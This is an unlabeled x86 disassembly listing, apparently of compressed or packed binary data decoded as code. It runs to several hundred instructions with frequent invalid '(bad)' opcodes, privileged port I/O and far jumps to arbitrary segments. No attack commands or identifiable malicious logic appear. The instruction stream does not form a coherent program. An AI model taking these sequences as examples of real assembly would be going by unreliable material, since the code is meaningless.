  41f0b7:	cmp    BYTE PTR [esi-0x2499feec],0x4f
  41f0be:	pop    edx
  41f0bf:	std    
  41f0c0:	push   ebx
  41f0c1:	addr16 inc ebp
  41f0c3:	out    0x67,al
  41f0c5:	imul   esp,ebp,0xd80a3d00
  41f0cb:	test   al,0xd9
  41f0cd:	sbb    eax,0x5b622575
  41f0d2:	add    al,0x18
  41f0d4:	lds    edi,FWORD PTR ds:0x1efe0f7
  41f0da:	sbb    bh,BYTE PTR [edx-0x7b7aaf67]
  41f0e0:	pop    ecx
  41f0e1:	data16 cld 
  41f0e3:	mov    dh,0x53
  41f0e5:	push   edi
  41f0e6:	push   0x14095564
  41f0eb:	fcom   DWORD PTR [esi]
  41f0ed:	jge    0x41f07f
  41f0ef:	mov    ecx,0xe4398217
  41f0f4:	shl    BYTE PTR [eax-0x22],cl
  41f0f7:	iret   
  41f0f8:	leave  
  41f0f9:	push   eax
  41f0fa:	ins    BYTE PTR es:[edi],dx
  41f0fb:	jnp    0x41f09d
  41f0fd:	add    al,0x5c
  41f0ff:	dec    esi
  41f100:	inc    esp
  41f101:	add    ah,BYTE PTR [esi]
  41f103:	mov    cl,0x41
  41f105:	mov    BYTE PTR [ebx],dh
  41f107:	outs   dx,DWORD PTR ds:[esi]
  41f108:	jle    0x41f14c
  41f10a:	jae    0x41f0cf
  41f10c:	adc    al,0x17
  41f10e:	sub    DWORD PTR [esi-0x5dfc5d63],ebx
  41f114:	sub    al,0xe5
  41f116:	fisub  DWORD PTR [eax]
  41f118:	mov    BYTE PTR [ecx+0x6a6d45a],cl
  41f11e:	ds inc eax
  41f120:	mov    esp,0x4850ddca
  41f125:	xchg   esi,eax
  41f126:	xchg   ebp,eax
  41f127:	imul   esi,edx,0xee36c12d
  41f12d:	mov    al,ds:0x6cdb97a3
  41f132:	aad    0x88
  41f134:	ficomp WORD PTR [ecx+0x2bbc3f04]
  41f13a:	push   esp
  41f13b:	sbb    al,0xb9
  41f13d:	pop    ds
  41f13e:	(bad)  
  41f13f:	jmp    0x41f1a7
  41f141:	or     cl,BYTE PTR [ebp+0x7f33475d]
  41f147:	cmp    al,0xe9
  41f149:	ret    
  41f14a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f14b:	dec    edx
  41f14c:	pop    es
  41f14d:	adc    DWORD PTR [eax+0x7f009afd],0x2c1828e3
  41f157:	loop   0x41f14f
  41f159:	addr16 dec esi
  41f15b:	fstp   st(5)
  41f15d:	sbb    al,BYTE PTR [edi+0x63525cc6]
  41f163:	mov    al,ds:0x3597f572
  41f168:	or     WORD PTR [esi+0x2e],bx
  41f16c:	rcr    BYTE PTR ds:0x367c0e50,1
  41f172:	sar    BYTE PTR [edi+ecx*2+0x6720d44e],1
  41f179:	jne    0x41f147
  41f17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f17c:	cld    
  41f17d:	enter  0x1aed,0x18
  41f181:	pop    edi
  41f182:	xor    cl,BYTE PTR [eax+0x13b097f1]
  41f188:	add    DWORD PTR [eax+0x56],esp
  41f18b:	sub    al,0x50
  41f18d:	mov    bh,0xa9
  41f18f:	mov    ds:0x27b11f5e,al
  41f194:	add    al,0xe2
  41f196:	pop    ecx
  41f197:	sub    BYTE PTR [eax+0x7a],bh
  41f19a:	retf   0x7f69
  41f19d:	add    eax,0x6002427c
  41f1a2:	rcl    DWORD PTR [edx+0x8],cl
  41f1a5:	xor    ebx,DWORD PTR [edi+0x5c43dd3f]
  41f1ab:	les    ebx,FWORD PTR [ebx+0x35]
  41f1ae:	push   0xffffffd0
  41f1b0:	aad    0xc4
  41f1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1b3:	adc    eax,0x1bd80ef6
  41f1b8:	cmp    al,0x7f
  41f1ba:	inc    ecx
  41f1bb:	pop    ebp
  41f1bc:	or     eax,0xe8461ff9
  41f1c1:	(bad)  
  41f1c2:	pop    ebp
  41f1c3:	popa   
  41f1c4:	inc    edx
  41f1c5:	add    BYTE PTR [esp+eiz*2+0xc6f445d],dh
  41f1cc:	lea    esi,[esi-0x16]
  41f1cf:	dec    eax
  41f1d0:	int3   
  41f1d1:	jb     0x41f23b
  41f1d3:	or     BYTE PTR [eax],dl
  41f1d5:	(bad)  
  41f1d6:	inc    ebx
  41f1d7:	seta   al
  41f1da:	push   ebx
  41f1db:	mov    dl,0x6b
  41f1dd:	or     dh,BYTE PTR [ebx]
  41f1df:	(bad)  
  41f1e1:	mov    cl,0x2e
  41f1e3:	leave  
  41f1e4:	jnp    0x41f21a
  41f1e6:	popa   
  41f1e7:	dec    ecx
  41f1e8:	lods   eax,DWORD PTR ds:[esi]
  41f1e9:	mov    edx,0xe2dce219
  41f1ee:	mov    ebp,DWORD PTR [ecx-0x419476d6]
  41f1f4:	mov    dl,0x3e
  41f1f6:	sub    ah,BYTE PTR [edi+0x7063349e]
  41f1fc:	lahf   
  41f1fd:	pop    es
  41f1fe:	je     0x41f1a4
  41f200:	jae    0x41f1c2
  41f202:	dec    edx
  41f203:	pop    es
  41f204:	push   ss
  41f205:	ins    DWORD PTR es:[edi],dx
  41f206:	cmp    DWORD PTR ds:0xba4419a5,edx
  41f20c:	fldenv [ebx+edx*8-0x776eade]
  41f213:	mov    eax,ds:0x1037c204
  41f218:	lea    ebx,[edi+0x20]
  41f21b:	mov    al,ds:0xbd0775dd
  41f220:	sub    edx,DWORD PTR [edi+0x76f0fc5f]
  41f226:	mov    ecx,DWORD PTR [edx]
  41f228:	int    0x59
  41f22a:	push   ax
  41f22c:	cmp    BYTE PTR [edx+eiz*4+0x77],bh
  41f230:	nop
  41f231:	aaa    
  41f232:	mov    eax,ds:0x591ed78
  41f237:	ja     0x41f26f
  41f239:	call   0x4580:0x58d0d52d
  41f240:	pusha  
  41f241:	and    eax,0x510a0d63
  41f246:	or     BYTE PTR ds:0x6eac5633,ah
  41f24c:	ins    DWORD PTR es:[edi],dx
  41f24d:	scas   al,BYTE PTR es:[edi]
  41f24e:	add    al,ah
  41f250:	js     0x41f203
  41f252:	jae    0x41f274
  41f254:	ins    BYTE PTR es:[edi],dx
  41f255:	mov    ah,BYTE PTR ds:0xbf73e3dc
  41f25b:	sub    eax,0x27fab737
  41f260:	mov    ch,0x2a
  41f262:	pop    ss
  41f263:	mov    BYTE PTR [ebx-0x8234c4f],ch
  41f269:	add    cl,dh
  41f26b:	push   ds
  41f26c:	xchg   esi,edx
  41f26e:	(bad)  
  41f26f:	fldcw  WORD PTR [esi+0x43]
  41f272:	and    cl,BYTE PTR [ebx]
  41f274:	addr16 ret 
  41f276:	clc    
  41f277:	idiv   esi
  41f279:	(bad)  
  41f27a:	adc    eax,DWORD PTR [eax+0x51c078d0]
  41f280:	jbe    0x41f2ce
  41f282:	cmc    
  41f283:	cmp    al,0x27
  41f285:	jle    0x41f2f3
  41f287:	imul   ecx,DWORD PTR [esi],0x7bdc44ad
  41f28d:	je     0x41f30d
  41f28f:	loope  0x41f23e
  41f291:	add    ebx,DWORD PTR [edi]
  41f293:	push   ebp
  41f294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f295:	outs   dx,DWORD PTR ds:[esi]
  41f296:	aad    0x69
  41f298:	inc    edx
  41f299:	iret   
  41f29a:	and    eax,0x6bc0d9dc
  41f29f:	loop   0x41f2e7
  41f2a1:	sbb    al,0x6f
  41f2a3:	jne    0x41f2b6
  41f2a5:	sti    
  41f2a6:	adc    al,0x42
  41f2a8:	pop    ss
  41f2a9:	or     BYTE PTR [esp+esi*1+0x11],al
  41f2ad:	loop   0x41f28d
  41f2af:	mov    ebp,0xc8ee8797
  41f2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b5:	mov    DWORD PTR [eax-0x3c63ffdf],0xb1eede16
  41f2bf:	add    DWORD PTR [ebp+0x4d4063a4],ecx
  41f2c5:	xor    eax,0x72ccc84b
  41f2ca:	or     DWORD PTR [ebx+0x166fac68],ebx
  41f2d0:	mov    eax,ds:0x30905134
  41f2d5:	push   ds
  41f2d6:	pop    ds
  41f2d7:	(bad)  
  41f2d8:	adc    eax,0x74aeac1c
  41f2dd:	pop    es
  41f2de:	and    al,bh
  41f2e0:	xor    eax,DWORD PTR [ebx-0x24]
  41f2e3:	sbb    DWORD PTR ds:0xe5e54f10,ecx
  41f2e9:	pop    ds
  41f2ea:	lea    edx,[ecx]
  41f2ec:	inc    ebp
  41f2ed:	inc    ebx
  41f2ee:	fisttp QWORD PTR [ebp-0x47b636fc]
  41f2f4:	mov    edx,0x29120f74
  41f2f9:	sbb    esi,edi
  41f2fb:	in     al,0x20
  41f2fd:	mov    ebp,0xb4ea73d8
  41f302:	rcl    BYTE PTR [esi-0x62],0xe4
  41f306:	loope  0x41f382
  41f308:	push   0xffffff87
  41f30a:	adc    al,BYTE PTR [ecx-0x7cb6020e]
  41f310:	xchg   edi,eax
  41f311:	sub    BYTE PTR [ebx+0x13e3be3c],al
  41f317:	cmp    eax,0x18c799ca
  41f31c:	ins    DWORD PTR es:[edi],dx
  41f31d:	lods   al,BYTE PTR ds:[esi]
  41f31e:	repz add dl,dl
  41f321:	xor    eax,0x11766216
  41f326:	dec    edx
  41f327:	and    al,0x70
  41f329:	adc    al,0xd5
  41f32b:	push   ds
  41f32c:	hlt    
  41f32d:	mov    ah,0x6a
  41f32f:	mov    esi,0xd39d8b8e
  41f334:	retf   0x8962
  41f337:	dec    edx
  41f338:	mov    ch,0xc5
  41f33a:	mov    ebx,0x73e1aa2
  41f33f:	mov    bh,0x50
  41f341:	mov    dl,0x22
  41f343:	and    ebp,edi
  41f345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f346:	fisub  DWORD PTR [edx+eax*4]
  41f349:	pop    ss
  41f34a:	nop
  41f34b:	jns    0x41f32d
  41f34d:	fdivr  st,st(4)
  41f34f:	gs popf 
  41f351:	pop    ds
  41f352:	push   es
  41f353:	hlt    
  41f354:	nop
  41f355:	push   ebp
  41f356:	nop
  41f357:	out    dx,eax
  41f358:	push   esi
  41f359:	dec    esi
  41f35a:	loop   0x41f33e
  41f35c:	popa   
  41f35d:	jo     0x41f384
  41f35f:	push   es
  41f360:	out    0x10,eax
  41f362:	leave  
  41f363:	mov    es,WORD PTR [eax]
  41f365:	ret    
  41f366:	mov    ch,0x5e
  41f368:	and    DWORD PTR [edi-0x1f54e5aa],edi
  41f36e:	(bad)  
  41f36f:	outs   dx,BYTE PTR ds:[esi]
  41f370:	xor    bh,dh
  41f372:	pop    es
  41f373:	int3   
  41f374:	stos   BYTE PTR es:[edi],al
  41f375:	dec    esi
  41f376:	(bad)  
  41f377:	(bad)  
  41f378:	jg     0x41f390
  41f37a:	pushf  
  41f37b:	dec    esi
  41f37c:	gs push ds
  41f37e:	cmp    DWORD PTR [esi],0x5a12cf06
  41f384:	mov    dh,0x93
  41f386:	xor    ah,BYTE PTR [ebx]
  41f388:	pop    esp
  41f389:	adc    eax,0x11bfa2e5
  41f38e:	pop    ds
  41f38f:	push   0x1b798dc6
  41f394:	or     DWORD PTR [edi-0x873bf31],ebp
  41f39a:	xlat   BYTE PTR ds:[ebx]
  41f39b:	cmp    eax,0x27b1db1f
  41f3a0:	xchg   esp,eax
  41f3a1:	sbb    al,0x9c
  41f3a3:	cwde   
  41f3a4:	xchg   edx,eax
  41f3a5:	(bad)  
  41f3a6:	lock add edx,edx
  41f3a9:	push   ebp
  41f3aa:	inc    eax
  41f3ab:	imul   edi,DWORD PTR [edx],0xffffffb0
  41f3ae:	fwait
  41f3af:	cmc    
  41f3b0:	xor    dl,cl
  41f3b2:	mov    eax,0x94ba6916
  41f3b7:	xchg   edi,eax
  41f3b8:	push   esi
  41f3b9:	or     eax,DWORD PTR [eax+edi*8]
  41f3bc:	sti    
  41f3bd:	sub    bl,BYTE PTR [eax-0x2f]
  41f3c0:	in     eax,0xa4
  41f3c2:	jecxz  0x41f3ee
  41f3c4:	scas   al,BYTE PTR es:[edi]
  41f3c5:	or     edi,DWORD PTR [eax+0x68]
  41f3c8:	jne    0x41f3d9
  41f3ca:	and    DWORD PTR [ecx],esi
  41f3cc:	cld    
  41f3cd:	es pop ds
  41f3cf:	ss jg  0x41f37c
  41f3d2:	test   al,0x4b
  41f3d4:	cld    
  41f3d5:	stos   DWORD PTR es:[edi],eax
  41f3d6:	mov    dl,0xf
  41f3d8:	and    al,al
  41f3da:	mov    ds:0x4df367a3,eax
  41f3df:	enter  0x3598,0xc5
  41f3e3:	ror    DWORD PTR [edx+0x15],cl
  41f3e6:	inc    ebp
  41f3e7:	les    eax,FWORD PTR [eax-0x29]
  41f3ea:	sbb    BYTE PTR [eax+ebp*8-0x467771e9],dl
  41f3f1:	sub    eax,0x9e597403
  41f3f6:	jne    0x41f397
  41f3f8:	push   ss
  41f3f9:	mov    dl,0xd3
  41f3fb:	stos   DWORD PTR es:[edi],eax
  41f3fc:	daa    
  41f3fd:	pushf  
  41f3fe:	cld    
  41f3ff:	push   esp
  41f400:	push   es
  41f401:	cwde   
  41f402:	cmp    al,ah
  41f404:	ja     0x41f3ba
  41f406:	jb     0x41f3a4
  41f408:	sbb    BYTE PTR [eax+0x61d17237],0xd2
  41f40f:	adc    eax,0xd2c3ddde
  41f414:	leave  
  41f415:	shl    BYTE PTR [ebx-0x7da4502],1
  41f41b:	je     0x41f425
  41f41d:	rcl    BYTE PTR [eax+0x777b56e5],0x59
  41f424:	xchg   edi,eax
  41f425:	xchg   ecx,eax
  41f426:	hlt    
  41f427:	ror    BYTE PTR [eax+0x64],1
  41f42a:	bound  ecx,QWORD PTR [eax+eax*2+0x76ad0e51]
  41f431:	push   eax
  41f432:	(bad)  
  41f433:	mov    esp,0xd11e6d89
  41f438:	pop    edi
  41f439:	stc    
  41f43a:	mov    al,0xf6
  41f43c:	lock scas eax,DWORD PTR es:[edi]
  41f43e:	test   BYTE PTR [ecx],dh
  41f440:	and    eax,edx
  41f442:	leave  
  41f443:	mov    eax,ds:0x4073793a
  41f448:	add    BYTE PTR [eax],al
  41f44a:	push   edx
  41f44b:	dec    ebp
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	cmp    DWORD PTR [ebx-0x4b],esi
  41f459:	inc    esp
  41f45a:	(bad)  
  41f45b:	add    DWORD PTR [ecx],0x0
  41f45e:	xchg   BYTE PTR [esi],al
  41f460:	add    BYTE PTR [eax],al
  41f462:	enter  0xdb7c,0x20
  41f466:	jge    0x41f428
  41f468:	stos   DWORD PTR es:[edi],eax
  41f469:	mov    dl,0xf7
  41f46b:	jge    0x41f479
  41f46d:	out    dx,eax
  41f46e:	outs   dx,BYTE PTR ds:[esi]
  41f46f:	stc    
  41f470:	mov    bl,0x32
  41f472:	jmp    0x21a0:0xbbedfe75
  41f479:	xor    dl,ch
  41f47b:	dec    edx
  41f47c:	mov    ds:0x3c845e3e,eax
  41f481:	ficomp DWORD PTR [ebx-0x196275ee]
  41f487:	popf   
  41f488:	jp     0x41f48f
  41f48a:	inc    ebx
  41f48b:	jae    0x41f4c1
  41f48d:	in     eax,dx
  41f48e:	pusha  
  41f48f:	rol    DWORD PTR [eax+0x1e],1
  41f492:	jp     0x41f439
  41f494:	inc    ebp
  41f495:	push   ss
  41f496:	adc    edx,DWORD PTR [edx-0x1a4a6a04]
  41f49c:	dec    edi
  41f49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f49e:	and    bh,BYTE PTR [ebx-0x262cf652]
  41f4a4:	mov    edx,0x698069f8
  41f4a9:	xor    esp,DWORD PTR [edx]
  41f4ab:	test   eax,0x4d993394
  41f4b0:	xchg   BYTE PTR [esi-0x52],dl
  41f4b3:	mov    dl,0x31
  41f4b5:	or     BYTE PTR [esi+0x44],0xe5
  41f4b9:	cld    
  41f4ba:	inc    esi
  41f4bb:	jmp    0x836cc866
  41f4c0:	dec    esp
  41f4c1:	inc    edi
  41f4c2:	test   BYTE PTR [eax-0x45516702],ah
  41f4c8:	push   eax
  41f4c9:	adc    al,0x9e
  41f4cb:	dec    eax
  41f4cc:	lds    edi,FWORD PTR [ebx+0x4a]
  41f4cf:	lock push edi
  41f4d1:	xchg   ebx,eax
  41f4d2:	idiv   DWORD PTR [ebp-0x58]
  41f4d5:	shl    BYTE PTR [edx+0x30],1
  41f4d8:	sbb    eax,0x61cf7d12
  41f4dd:	ins    DWORD PTR es:[edi],dx
  41f4de:	ds add eax,0xc81ec090
  41f4e4:	fmul   QWORD PTR [edx-0x31]
  41f4e7:	jmp    0xdfad:0x3f4d9e5c
  41f4ee:	pop    ss
  41f4ef:	test   eax,0x6cd735c1
  41f4f4:	or     BYTE PTR [edx],bh
  41f4f6:	jae    0x41f4ed
  41f4f8:	arpl   WORD PTR [edx+ecx*1],bx
  41f4fb:	xchg   edx,eax
  41f4fc:	mov    ah,0x37
  41f4fe:	push   ecx
  41f4ff:	jnp    0x41f539
  41f501:	push   edx
  41f502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f503:	mov    eax,ds:0x43d667f5
  41f508:	push   eax
  41f509:	fiadd  WORD PTR [eax-0x41ee1a34]
  41f50f:	repnz into 
  41f511:	repnz xchg esi,eax
  41f513:	sbb    DWORD PTR [edx+eax*8-0x62],ecx
  41f517:	adc    bh,BYTE PTR [edi]
  41f519:	mov    DWORD PTR [edx],esp
  41f51b:	out    0x69,al
  41f51d:	xchg   ebx,eax
  41f51e:	or     edx,DWORD PTR ds:0xaa04bda2
  41f524:	inc    eax
  41f525:	mov    dh,0x37
  41f527:	cli    
  41f528:	xchg   ecx,eax
  41f529:	xor    al,0xaf
  41f52b:	mov    ?,WORD PTR [esi]
  41f52d:	jnp    0x41f592
  41f52f:	inc    edx
  41f530:	jg     0x41f57f
  41f532:	push   esp
  41f533:	aad    0x5a
  41f535:	enter  0x8f22,0x76
  41f539:	aas    
  41f53a:	xor    eax,0x78209e49
  41f53f:	aam    0xfe
  41f541:	pop    eax
  41f542:	iret   
  41f543:	scas   eax,DWORD PTR es:[edi]
  41f544:	std    
  41f545:	sub    eax,0x5d0f1130
  41f54a:	lods   al,BYTE PTR ds:[esi]
  41f54b:	push   ebx
  41f54c:	cmp    ecx,eax
  41f54e:	mov    esi,esp
  41f550:	and    ch,BYTE PTR [edx-0x42b0fede]
  41f556:	mov    al,ds:0x6113c320
  41f55b:	imul   BYTE PTR [ebp-0x16]
  41f55e:	push   0x3741d442
  41f563:	lds    eax,FWORD PTR [ecx-0x150a4234]
  41f569:	sub    dl,BYTE PTR [ebx+0x571aa742]
  41f56f:	stos   DWORD PTR es:[edi],eax
  41f570:	inc    ebp
  41f571:	data16 xor dh,BYTE PTR [edx+ecx*2+0x1d]
  41f576:	(bad)  
  41f577:	sbb    ch,BYTE PTR [esi-0x71d4b87a]
  41f57d:	loopne 0x41f5f2
  41f57f:	jno    0x41f5b0
  41f581:	pop    ecx
  41f582:	or     ebp,DWORD PTR [ebx-0x33603f3c]
  41f588:	push   ecx
  41f589:	add    DWORD PTR [eax],eax
  41f58b:	mov    dh,0x2c
  41f58d:	adc    DWORD PTR [ebp+ebx*4+0x6ed4049d],ebx
  41f594:	or     esi,DWORD PTR [esi]
  41f596:	icebp  
  41f597:	je     0x41f58f
  41f599:	shr    BYTE PTR [edx-0x250b695a],1
  41f59f:	in     al,dx
  41f5a0:	lock into 
  41f5a2:	cdq    
  41f5a3:	xchg   edx,eax
  41f5a4:	cli    
  41f5a5:	push   ecx
  41f5a6:	xchg   edx,eax
  41f5a7:	les    eax,FWORD PTR [ecx+0x2c1b6ff1]
  41f5ad:	or     al,0x71
  41f5af:	xchg   BYTE PTR [edi+0x28abbbe4],dh
  41f5b5:	sbb    al,0xcc
  41f5b7:	call   0x51bd:0xe242ee8a
  41f5be:	lahf   
  41f5bf:	into   
  41f5c0:	push   ss
  41f5c1:	mov    edi,0x14e600dd
  41f5c6:	mov    esp,0x49cc5356
  41f5cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5cc:	mov    WORD PTR [edx],cs
  41f5ce:	leave  
  41f5cf:	add    al,0x20
  41f5d1:	jp     0x41f5fd
  41f5d3:	xor    DWORD PTR gs:[esi+0x4],ecx
  41f5d7:	arpl   WORD PTR [eax],si
  41f5d9:	lods   eax,DWORD PTR ds:[esi]
  41f5da:	lods   al,BYTE PTR ds:[esi]
  41f5db:	pop    es
  41f5dc:	icebp  
  41f5dd:	xchg   edx,eax
  41f5de:	inc    esp
  41f5df:	icebp  
  41f5e0:	xchg   ebp,eax
  41f5e1:	clc    
  41f5e2:	mov    ebx,edi
  41f5e4:	mov    al,ds:0xc1fdab8
  41f5e9:	and    BYTE PTR [edx-0x2f97d647],dl
  41f5ef:	dec    edi
  41f5f0:	pop    esi
  41f5f1:	(bad)  
  41f5f2:	or     eax,0x213a2cb1
  41f5f7:	mov    dh,0xdf
  41f5f9:	cdq    
  41f5fa:	sbb    DWORD PTR [edi-0x4a],esp
  41f5fd:	jl     0x41f5b4
  41f5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f600:	mov    bl,0xb1
  41f602:	out    0x68,eax
  41f604:	call   0x9d17:0x8e2e14d4
  41f60b:	aam    0x58
  41f60d:	ret    
  41f60e:	xchg   edi,eax
  41f60f:	xchg   ebp,eax
  41f610:	into   
  41f611:	pop    esp
  41f612:	jnp    0x41f649
  41f614:	dec    eax
  41f615:	or     DWORD PTR [ebx],0xffffff8a
  41f618:	in     eax,0xb6
  41f61a:	inc    eax
  41f61b:	int    0x2
  41f61d:	(bad)  
  41f61e:	sti    
  41f61f:	xor    esi,edx
  41f621:	repz mov edi,ss
  41f624:	std    
  41f625:	repz push ss
  41f627:	xchg   edx,eax
  41f628:	call   DWORD PTR [ebp-0x68bdca32]
  41f62e:	sbb    al,0x88
  41f630:	push   esi
  41f631:	dec    edx
  41f632:	sbb    eax,0xb46d1340
  41f637:	ss pushf 
  41f639:	push   cs
  41f63a:	(bad)  
  41f63b:	nop
  41f63c:	mov    bl,0x6e
  41f63e:	lods   al,BYTE PTR ds:[esi]
  41f63f:	leave  
  41f640:	add    edx,eax
  41f642:	push   esi
  41f643:	pop    edi
  41f644:	lahf   
  41f645:	add    esp,DWORD PTR [edx+0x67c9d9e0]
  41f64b:	stos   BYTE PTR es:[edi],al
  41f64c:	or     eax,0x9d1c1fcb
  41f651:	popa   
  41f652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f653:	pop    ebx
  41f654:	popf   
  41f655:	es dec edi
  41f657:	adc    ch,al
  41f659:	add    al,bh
  41f65b:	xor    bh,BYTE PTR [edx-0x3c]
  41f65e:	and    DWORD PTR [esi],edx
  41f660:	jmp    0xd7dcb34b
  41f665:	mul    BYTE PTR [esi-0x69301312]
  41f66b:	nop
  41f66c:	retf   
  41f66d:	out    dx,al
  41f66e:	retf   
  41f66f:	dec    esi
  41f670:	jae    0x41f654
  41f672:	mov    edi,0xcd4314c6
  41f677:	popa   
  41f678:	(bad)  
  41f679:	repz pop ds
  41f67b:	std    
  41f67c:	push   edx
  41f67d:	push   esp
  41f67e:	icebp  
  41f67f:	ss and ah,al
  41f682:	adc    al,0x52
  41f684:	repnz cmp ah,ah
  41f687:	pop    ebx
  41f688:	mov    cl,0x0
  41f68a:	ins    DWORD PTR es:[edi],dx
  41f68b:	aas    
  41f68c:	or     al,BYTE PTR [ebx+0x36219a39]
  41f692:	sbb    al,0x1e
  41f694:	popf   
  41f695:	repnz aaa 
  41f697:	mov    esp,0x94caf78
  41f69c:	out    0x9a,eax
  41f69e:	das    
  41f69f:	stos   DWORD PTR es:[edi],eax
  41f6a0:	jmp    0x41f6c3
  41f6a2:	xchg   ebp,eax
  41f6a3:	cs sahf 
  41f6a5:	aam    0x70
  41f6a7:	xchg   edi,eax
  41f6a8:	jae    0x41f667
  41f6aa:	jmp    0x41f724
  41f6ac:	bound  ecx,QWORD PTR [ebp+0x2765682e]
  41f6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6b3:	aad    0xcf
  41f6b5:	cmp    BYTE PTR [ebx+0x194c4e72],0x11
  41f6bc:	pop    esp
  41f6bd:	loope  0x41f658
  41f6bf:	stc    
  41f6c0:	in     eax,dx
  41f6c1:	mov    bh,0xd0
  41f6c3:	loope  0x41f72f
  41f6c5:	inc    ecx
  41f6c6:	ror    DWORD PTR [ecx+0x44],0xbd
  41f6ca:	pop    ecx
  41f6cb:	pop    ss
  41f6cc:	mov    bl,0x8d
  41f6ce:	sbb    eax,0x19da68e4
  41f6d3:	inc    ecx
  41f6d4:	adc    ah,BYTE PTR [ebx+0xcab3cd9]
  41f6da:	loopne 0x41f661
  41f6dc:	in     al,0x5f
  41f6de:	and    al,0x51
  41f6e0:	std    
  41f6e1:	daa    
  41f6e2:	scas   ax,WORD PTR es:[edi]
  41f6e4:	xlat   BYTE PTR ds:[ebx]
  41f6e5:	push   es
  41f6e6:	ret    
  41f6e7:	xchg   DWORD PTR [edx+0x4],ecx
  41f6ea:	mov    es,WORD PTR [eax+0x46]
  41f6ed:	loopne 0x41f6d6
  41f6ef:	pop    esp
  41f6f0:	and    ah,BYTE PTR [eax+0x78]
  41f6f3:	out    dx,al
  41f6f4:	sbb    eax,0x61305f7a
  41f6fa:	pop    ds
  41f6fb:	test   DWORD PTR [ebx+0x22],0xdb411048
  41f702:	lahf   
  41f703:	in     al,0xcb
  41f705:	stos   DWORD PTR es:[edi],eax
  41f706:	xchg   ebp,eax
  41f707:	jg     0x41f773
  41f709:	adc    edx,edi
  41f70b:	push   0x60
  41f70d:	and    dl,al
  41f70f:	rol    BYTE PTR ds:0x6d9e1038,1
  41f715:	(bad)  
  41f716:	arpl   WORD PTR [edx-0x2489e6ae],bx
  41f71c:	adc    cl,BYTE PTR [edx+0x7fd7aa93]
  41f722:	inc    edi
  41f723:	cs jge 0x41f759
  41f726:	test   al,0xc0
  41f728:	lea    ecx,ds:0x6295f107
  41f72e:	stos   DWORD PTR es:[edi],eax
  41f72f:	lods   al,BYTE PTR ds:[esi]
  41f730:	dec    ebx
  41f731:	outs   dx,DWORD PTR ds:[si]
  41f733:	loopne 0x41f795
  41f735:	push   eax
  41f736:	push   esp
  41f737:	icebp  
  41f738:	or     al,0xf0
  41f73a:	cli    
  41f73b:	pop    esi
  41f73c:	cdq    
  41f73d:	sub    eax,0xbdc12708
  41f742:	push   esi
  41f743:	jbe    0x41f791
  41f745:	pop    esi
  41f746:	lock sub BYTE PTR [esi+0x48],0x5f
  41f74b:	retf   
  41f74c:	js     0x41f79b
  41f74e:	cmp    al,0xe4
  41f750:	ror    ch,0xff
  41f753:	inc    esp
  41f754:	xchg   esi,eax
  41f755:	ins    DWORD PTR es:[edi],dx
  41f756:	lea    edi,[eax-0x40]
  41f759:	popf   
  41f75a:	in     eax,0xae
  41f75c:	mov    eax,ds:0x8d54d4cb
  41f761:	je     0x41f7b9
  41f763:	ss jmp 0x3902:0xe53e006a
  41f76b:	xchg   esp,eax
  41f76c:	addr16 ja 0x41f6f4
  41f76f:	cmp    DWORD PTR [esi+0x28],esi
  41f772:	sar    DWORD PTR [edx+edx*4-0x468e2ae1],0x83
  41f77a:	ret    0x906c
  41f77d:	repnz daa 
  41f77f:	and    eax,0x3723e58c
  41f784:	add    al,0x7b
  41f786:	sbb    DWORD PTR [edx+0x22],ecx
  41f789:	popa   
  41f78a:	and    eax,0x772a593
  41f78f:	inc    ecx
  41f790:	mov    esp,esi
  41f792:	sbb    ebp,DWORD PTR [eax]
  41f794:	sbb    DWORD PTR [ebx+0x28],0x294ada64
  41f79b:	int    0x37
  41f79d:	cmp    DWORD PTR [ebx+0x1b3bf361],eax
  41f7a3:	jmp    0x677902db
  41f7a8:	push   ebp
  41f7a9:	mov    al,0x1a
  41f7ab:	ret    
  41f7ac:	nop
  41f7ad:	lahf   
  41f7ae:	scas   eax,DWORD PTR es:[edi]
  41f7af:	(bad)  
  41f7b0:	mov    esp,0x20300f32
  41f7b5:	jl     0x41f7df
  41f7b7:	dec    eax
  41f7b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7b9:	(bad)  
  41f7ba:	xchg   ecx,eax
  41f7bb:	jmp    0xe8a:0xd06e8ef2
  41f7c2:	cld    
  41f7c3:	push   es
  41f7c4:	fwait
  41f7c5:	dec    ecx
  41f7c6:	jbe    0x41f7c9
  41f7c8:	fucom  st(6)
  41f7ca:	(bad)  
  41f7cc:	outs   dx,BYTE PTR ds:[esi]
  41f7cd:	add    ecx,esi
  41f7cf:	dec    ebp
  41f7d0:	cs enter 0x63ef,0x2a
  41f7d5:	mov    al,ds:0x5ffb56be
  41f7da:	mov    cl,BYTE PTR [eax+0xd]
  41f7dd:	push   ebx
  41f7de:	and    BYTE PTR [esi+0x5eb3c06e],0xef
  41f7e5:	in     al,dx
  41f7e6:	jp     0x41f846
  41f7e8:	loopne 0x41f78e
  41f7ea:	daa    
  41f7eb:	dec    edi
  41f7ec:	mov    ah,0xad
  41f7ee:	mov    DWORD PTR [ebx-0x22],0x494e07dd
  41f7f5:	gs loop 0x41f814
  41f7f8:	hlt    
  41f7f9:	or     ecx,DWORD PTR [ecx+0x4]
  41f7fc:	cmp    dl,BYTE PTR ds:0xe3d60d2d
  41f802:	cdq    
  41f803:	out    0xf0,al
  41f805:	dec    ebx
  41f806:	in     al,dx
  41f807:	sub    eax,0x5037c2b2
  41f80c:	(bad)  
  41f80d:	inc    esp
  41f80e:	aas    
  41f80f:	xor    DWORD PTR [esi],ebx
  41f811:	jb     0x41f7a9
